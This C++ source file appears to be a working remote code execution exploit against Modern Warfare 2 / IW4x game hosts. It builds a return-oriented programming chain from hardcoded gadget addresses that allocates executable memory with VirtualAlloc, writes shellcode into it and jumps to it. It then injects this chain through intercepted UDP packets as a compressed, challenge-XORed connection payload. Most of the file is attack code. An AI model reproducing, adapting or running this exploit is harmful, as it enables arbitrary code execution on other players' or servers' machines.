#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

#include "Extern/Huffman.hpp"

//#define USE_IW4X

#ifdef USE_IW4X

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

#define ORG_PARAM 0x31D9390

#else

#define UNUSED_MEMORY_POINTER 0x642D718
#define UNUSED_DATA_POINTER 0x642D738
#define RESTORE_SERVER_CONTEXT 0x56A092

#define ORG_PARAM 0x3172010

#endif

void allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
{
	// Allocate executable memory
	stack->push_back(0x401000 + 0x00077a0a);  // pop esi
	stack->push_back(0x67D1E4);               // IAT: VirtualAlloc

	stack->push_back(0x401000 + 0x0017f5c8);  // mov eax, [esi]; pop esi
	stack->push_back(0);                      // padding

	stack->push_back(0x401000 + 0x000ded54);  // jmp eax

	stack->push_back(0x401000 + 0x00077a0a);  // pop esi - for saving the memory pointer

	stack->push_back(0);                      // addr
	stack->push_back(size);                   // size
	stack->push_back(MEM_COMMIT);             // addr
	stack->push_back(PAGE_EXECUTE_READWRITE); // permissions

											  // Save memory pointer
	stack->push_back(address);                // Target address
	stack->push_back(0x401000 + 0x00193450);  // mov [esi], eax
}

void writeDataInEax(std::vector<DWORD>* stack, std::string data)
{
	while (data.size() % 4) data.push_back(0);
	for (size_t i = 0; i < data.size(); i += 4)
	{
		stack->push_back(0x401000 + 0x000021a1);    // pop ecx
		stack->push_back(*PDWORD(data.data() + i)); // data
		stack->push_back(0x401000 + 0x00029059);    // mov [eax], ecx
		stack->push_back(0x401000 + 0x00254ab9);    // add eax, 3
		stack->push_back(0x401000 + 0x00064844);    // add eax, 1
	}
}

void freeMemory(std::vector<DWORD>* stack, DWORD address)
{
	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(address);

	stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(0x5B7880); // Z_VirtualFreeInternal

	stack->push_back(0x401000 + 0x00000039); // mov [esp + 4], eax; jmp edx

	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(0); // placeholder
}

void writeData(std::vector<DWORD>* stack, DWORD address, std::string data)
{
	data.push_back(0);
	while (data.size() % 4) data.push_back(0);

	stack->push_back(0x401000 + 0x00077a0a); // pop esi

	for (unsigned int i = 0; i < data.size(); i += 4)
	{
		stack->push_back(*(DWORD*)(data.data() + i));
		stack->push_back(0x401000 + 0x000421fe); // pop eax
		stack->push_back(address + i);
		stack->push_back(0x401000 + 0x00077a08); // mov [eax], esi; pop esi
	}

	stack->push_back(0);
}

std::string testExploit()
{
	std::vector<DWORD> stack;

	freeMemory(&stack, UNUSED_MEMORY_POINTER);

	//stack.push_back(0x5C96BA);

	writeData(&stack, UNUSED_DATA_POINTER, "Helloooooo Man");

	stack.push_back(0x5CB620);              // Sys_ShowErrorText
	stack.push_back(0x401000 + 0x00249982); // pop edx
	stack.push_back(UNUSED_DATA_POINTER);   // message

	stack.push_back(RESTORE_SERVER_CONTEXT); // restore server

	static unsigned char shellcode[] =
	{
		0x81, 0xEC, 0x70, 0x08, 0x00, 0x00, // sub esp, 870h
		0xC3                                // retn
	};

	std::vector<DWORD> fixup;
	fixup.push_back(0x56991E);  // pop eax
	fixup.push_back(ORG_PARAM); // old param? not really, but whatever

	allocateMemory(&fixup, UNUSED_MEMORY_POINTER, (sizeof(shellcode) + 3) & ~3);
	writeDataInEax(&fixup, std::string((char*)shellcode, sizeof shellcode));

	// Execute shellcode
	fixup.push_back(0x401000 + 0x00249982); // pop edx
	fixup.push_back(UNUSED_MEMORY_POINTER);
	fixup.push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

	fixup.push_back(0x401000 + 0x000ded54); // jmp eax

	std::string data;
	data.append(LPSTR(stack.data()), stack.size() * 4);
	data.resize(0x800);
	data.append(LPSTR(fixup.data()), fixup.size() * 4);

	return data;
}

namespace Game
{
	namespace MW2
	{
		Client::Client(Handler* _handler, Network::Address _target) : handler(_handler), target(_target)
		{
			this->onOOB("challengeResponse", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				this->challenge = strtoul(data.data(), nullptr, 10);
			});

			this->onOOB("statResponse", [this](Network::Packet* packet, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				if (atoi(data.data()) == 0)
				{
					this->sendInitialPayload(packet);
				}
			});

			this->onOOB("connect", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				static std::regex infoStringRegex("([0-9a-fA-F]+) \"(.+)\"");

				if (!receiving)
				{
					std::smatch match;
					if (std::regex_search(data, match, infoStringRegex) && match.size() >= 3)
					{
						Utils::InfoString info(match[2]);
						this->qport = USHORT(atoi(info.get("qport").data()));
						this->xuid = strtoull(info.get("xuid").data(), nullptr, 16);

						printf("Connecting to party at %s with xuid %llX as %s\n", this->target.toString().data(), this->xuid, info.get("name").data());
					}
				}
			});

			this->onOOB("connectResponse", [this](Network::Packet* /*packet*/, std::string /*data*/, bool receiving)
			{
				if (receiving)
				{
					printf("Connected to server!\n");
					/*MessageBoxA(0, 0, 0, 0);
					this->send(sniffer, networkIf, "\xFF\xFF\xFF\xFF" "relay 1234567890");*/
				}
			});
		}

		Client::~Client()
		{

		}

		void Client::sendInitialPayload(Network::Packet* packet)
		{
			Utils::Buffer buffer;

#ifdef USE_IW4X
			buffer.write<int>(-2);  // IW4x Magic
#endif

			buffer.write<int>(1);
			buffer.write<short>(this->qport); // qport

			buffer.write<char>(0);
			buffer.write<int>(0);
			buffer.write<int>(0);

			auto doHuffman = [](std::string data)
			{
				Huffman_InitMain();

				Utils::Memory::Allocator allocator;
				u_char* target = allocator.allocateArray<u_char>(0x10000 + data.size() * 2);

				int size = MSG_WriteBitsCompress(0, reinterpret_cast<const u_char*>(data.data()), target, data.size());
				return std::string(LPSTR(target), size);
			};

			std::string compr = doHuffman(testExploit());

			for (auto& chr : compr)
			{
				chr ^= char(this->challenge);
			}

			buffer.append(compr);

			this->send(packet, buffer);
			printf("Sending bytes %s\n", Utils::String::DumpHex(buffer, " ").data());
		}

		void Client::onOOB(std::string command, Callback callback)
		{
			this->oobHandlers[Utils::String(command).toLower()] = callback;
		}

		void Client::send(Network::Packet* packet, std::string data)
		{
			if (this->packetTemplate.staticData.empty()) return;

			Utils::Buffer buffer(this->packetTemplate.staticData);
			PBYTE buf = PBYTE(buffer.data());

			PWINDIVERT_IPHDR ipHeader = PWINDIVERT_IPHDR(buf);
			u_short ipHeaderLength = ipHeader->HdrLength * 4;
			ipHeader->Length = htons(u_short(ipHeaderLength + sizeof(WINDIVERT_UDPHDR) + data.size()));

			PWINDIVERT_UDPHDR udpHeader = PWINDIVERT_UDPHDR(buf + (ipHeader->HdrLength * 4));
			udpHeader->Length = htons(u_short(data.size() + sizeof(WINDIVERT_UDPHDR)));

			IN_ADDR source, dest;
			dest.S_un.S_addr = ipHeader->DstAddr;
			source.S_un.S_addr = ipHeader->SrcAddr;

			udpHeader->Checksum = 0;

			buffer.append(data);

			Network::Packet outPacket;
			outPacket.address = this->packetTemplate.address;
			outPacket.rawData = std::string_view(buffer.data(), buffer.size());

			packet->sniffer->send(&outPacket);
		}

		int Client::getDirection(Network::Address source, Network::Address _target)
		{
			if (source == this->target) return Client::PacketDirection::REMOTE_TO_LOCAL;
			if (_target == this->target) return Client::PacketDirection::LOCAL_TO_REMOTE;

			return Client::PacketDirection::NONE;
		}

		void Client::handle(Network::Packet* packet, bool receiving)
		{
			if (!receiving && this->packetTemplate.staticData.empty())
			{
				this->packetTemplate = *packet;
				this->packetTemplate.staticData = packet->rawData.substr(0, packet->rawData.size() - packet->data.size());
			}

			if (!this->handleOOB(packet, receiving))
			{
				this->handleNetchan(packet, receiving);
			}
		}

		bool Client::handleOOB(Network::Packet* packet, bool receiving)
		{
			if (packet->data.size() >= 4 && !std::memcmp(packet->data.data(), "\xFF\xFF\xFF\xFF", 4))
			{
				Utils::String command;
				for (auto i = packet->data.begin() + 4; i != packet->data.end(); ++i)
				{
					if (*i == '\0' || *i == '\n' || *i == ' ' || (i + 1) == packet->data.end())
					{
						command = std::string(packet->data.begin() + 4, i);
						break;
					}
				}

				std::string buffer;
				if (packet->data.size() >= command.size() + 5)
				{
					buffer = std::string(packet->data.begin() + command.size() + 5, packet->data.end());
				}

				auto callback = this->oobHandlers.find(command.toLower());
				if (callback != this->oobHandlers.end())
				{
					callback->second(packet, buffer, receiving);
				}

				return true;
			}

			return false;
		}

		void Client::handleNetchan(Network::Packet* packet, bool receiving)
		{
			// TODO Keep track of the natchan state
			packet; receiving;
		}
	}
}
